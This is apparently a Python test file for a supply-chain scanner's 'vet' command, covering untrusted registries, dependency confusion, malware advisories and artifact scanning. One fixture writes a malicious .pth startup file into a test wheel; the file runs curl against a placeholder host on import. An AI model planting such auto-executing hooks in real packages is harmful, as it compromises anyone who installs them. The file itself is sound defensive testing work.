from __future__ import annotations

import hashlib
import json
import zipfile
from unittest.mock import patch

from click.testing import CliRunner

from ca9.analyzers.supply_chain import analyze_supply_chain, evaluate_supply_chain_findings
from ca9.cli import main
from ca9.core.models import Artifact, Inventory, Package, SourceEvidence
from ca9.models import Vulnerability

UNTRUSTED_FYN_LOCK = """
version = 1

[[package]]
name = "demo"
version = "0.1.0"
source = { editable = "." }
dependencies = [{ name = "badlib" }]

[[package]]
name = "badlib"
version = "1.0.0"
source = { registry = "https://packages.example/simple" }
sdist = { url = "https://packages.example/badlib-1.0.0.tar.gz" }
"""

PYPI_FYN_LOCK = """
version = 1

[[package]]
name = "demo"
version = "0.1.0"
source = { editable = "." }
dependencies = [{ name = "requests" }]

[[package]]
name = "requests"
version = "2.31.0"
source = { registry = "https://pypi.org/simple" }
wheels = [
  { url = "https://files.pythonhosted.org/requests.whl", hash = "sha256:abc", size = 42 },
]
"""

NPM_PACKAGE_LOCK = {
    "name": "demo-npm",
    "version": "0.1.0",
    "lockfileVersion": 3,
    "packages": {
        "": {
            "name": "demo-npm",
            "version": "0.1.0",
            "dependencies": {"left-pad": "1.3.0"},
        },
        "node_modules/left-pad": {
            "version": "1.3.0",
            "resolved": "https://registry.npmjs.org/left-pad/-/left-pad-1.3.0.tgz",
            "integrity": "sha512-left-pad",
        },
    },
}


def test_supply_chain_analyzer_flags_untrusted_registry_and_install_risk():
    evidence = SourceEvidence(source="test", path="fyn.lock", reader="fyn.lock")
    inventory = Inventory(
        repo_path=".",
        packages=(
            Package(
                name="badlib",
                version="1.0.0",
                dependency_kind="direct",
                source_registry="https://packages.example/simple",
                artifacts=(Artifact(kind="sdist", url="https://packages.example/badlib.tar.gz"),),
                evidence=(evidence,),
            ),
        ),
    )

    findings = analyze_supply_chain(inventory)
    decisions = evaluate_supply_chain_findings(findings)

    signal_types = {finding.signal_type for finding in findings}
    assert "untrusted_registry" in signal_types
    assert "missing_artifact_hash" in signal_types
    assert "sdist_only" in signal_types
    assert any(decision.action == "block" for decision in decisions)


def test_vet_cli_blocks_direct_untrusted_registry(tmp_path):
    repo = tmp_path / "repo"
    repo.mkdir()
    (repo / "fyn.lock").write_text(UNTRUSTED_FYN_LOCK)

    runner = CliRunner()
    result = runner.invoke(main, ["vet", "--repo", str(repo), "-f", "json"])

    assert result.exit_code == 1
    data = json.loads(result.output)
    assert data["schema_version"] == "ca9.vet.v1"
    assert data["summary"]["blocking"] == 1
    assert any(finding["signal_type"] == "untrusted_registry" for finding in data["findings"])


def test_vet_cli_blocks_internal_package_from_public_index(tmp_path):
    repo = tmp_path / "repo"
    repo.mkdir()
    (repo / "fyn.lock").write_text(
        """
version = 1

[[package]]
name = "demo"
version = "0.1.0"
source = { editable = "." }
dependencies = [{ name = "acme-internal" }]

[[package]]
name = "acme-internal"
version = "1.0.0"
source = { registry = "https://pypi.org/simple" }
"""
    )

    runner = CliRunner()
    result = runner.invoke(
        main,
        [
            "vet",
            "--repo",
            str(repo),
            "-f",
            "json",
            "--internal-package",
            "acme-*",
            "--private-index",
            "https://packages.acme.internal/simple",
        ],
    )

    assert result.exit_code == 1
    data = json.loads(result.output)
    assert any(finding["signal_type"] == "dependency_confusion" for finding in data["findings"])


def test_vet_cli_allows_internal_package_from_private_index(tmp_path):
    repo = tmp_path / "repo"
    repo.mkdir()
    (repo / "fyn.lock").write_text(
        """
version = 1

[[package]]
name = "demo"
version = "0.1.0"
source = { editable = "." }
dependencies = [{ name = "acme-internal" }]

[[package]]
name = "acme-internal"
version = "1.0.0"
source = { registry = "https://packages.acme.internal/simple" }
"""
    )

    runner = CliRunner()
    result = runner.invoke(
        main,
        [
            "vet",
            "--repo",
            str(repo),
            "-f",
            "json",
            "--trusted-index",
            "https://packages.acme.internal/simple",
            "--internal-package",
            "acme-*",
            "--private-index",
            "https://packages.acme.internal/simple",
        ],
    )

    assert result.exit_code == 0
    data = json.loads(result.output)
    assert not any(finding["signal_type"] == "dependency_confusion" for finding in data["findings"])


def test_vet_cli_can_query_known_malware_advisories(tmp_path):
    repo = tmp_path / "repo"
    repo.mkdir()
    (repo / "fyn.lock").write_text(PYPI_FYN_LOCK)

    vuln = Vulnerability(
        id="MAL-2025-0001",
        package_name="requests",
        package_version="2.31.0",
        severity="critical",
        title="Malicious package",
        advisory_source="osv.dev",
        advisory_url="https://osv.dev/vulnerability/MAL-2025-0001",
    )

    runner = CliRunner()
    with patch("ca9.scanner.query_osv_batch", return_value=[vuln]) as mock_query:
        result = runner.invoke(
            main,
            ["vet", "--repo", str(repo), "-f", "json", "--malware-query", "--offline"],
        )

    assert result.exit_code == 1
    mock_query.assert_called_once()
    data = json.loads(result.output)
    assert data["summary"]["blocking"] == 1
    assert data["findings"][0]["signal_type"] == "malware"


def test_vet_cli_allows_default_npm_registry_from_package_lock(tmp_path):
    repo = tmp_path / "repo"
    repo.mkdir()
    (repo / "package-lock.json").write_text(json.dumps(NPM_PACKAGE_LOCK))

    runner = CliRunner()
    result = runner.invoke(main, ["vet", "--repo", str(repo), "-f", "json"])

    assert result.exit_code == 0
    data = json.loads(result.output)
    assert data["summary"]["blocking"] == 0
    assert not any(finding["signal_type"] == "untrusted_registry" for finding in data["findings"])


def test_vet_cli_scan_artifacts_blocks_malicious_pth(tmp_path):
    artifact = tmp_path / "badlib-1.0.0-py3-none-any.whl"
    with zipfile.ZipFile(artifact, "w") as zf:
        zf.writestr("badlib.pth", "import os; os.system('curl https://example.invalid/p')\n")

    repo = tmp_path / "repo"
    repo.mkdir()
    (repo / "fyn.lock").write_text(
        f"""
version = 1

[[package]]
name = "demo"
version = "0.1.0"
source = {{ editable = "." }}
dependencies = [{{ name = "badlib" }}]

[[package]]
name = "badlib"
version = "1.0.0"
source = {{ registry = "https://pypi.org/simple" }}
wheels = [
  {{ url = "{artifact.as_uri()}", hash = "sha256:{_sha256(artifact)}", size = 42 }},
]
"""
    )

    runner = CliRunner()
    result = runner.invoke(main, ["vet", "--repo", str(repo), "-f", "json", "--scan-artifacts"])

    assert result.exit_code == 1
    data = json.loads(result.output)
    assert data["summary"]["artifact_scans"] == 1
    assert any(finding["signal_type"] == "python-startup-pth-exec" for finding in data["findings"])


def _sha256(path) -> str:
    digest = hashlib.sha256()
    with path.open("rb") as f:
        for chunk in iter(lambda: f.read(1024 * 1024), b""):
            digest.update(chunk)
    return digest.hexdigest()
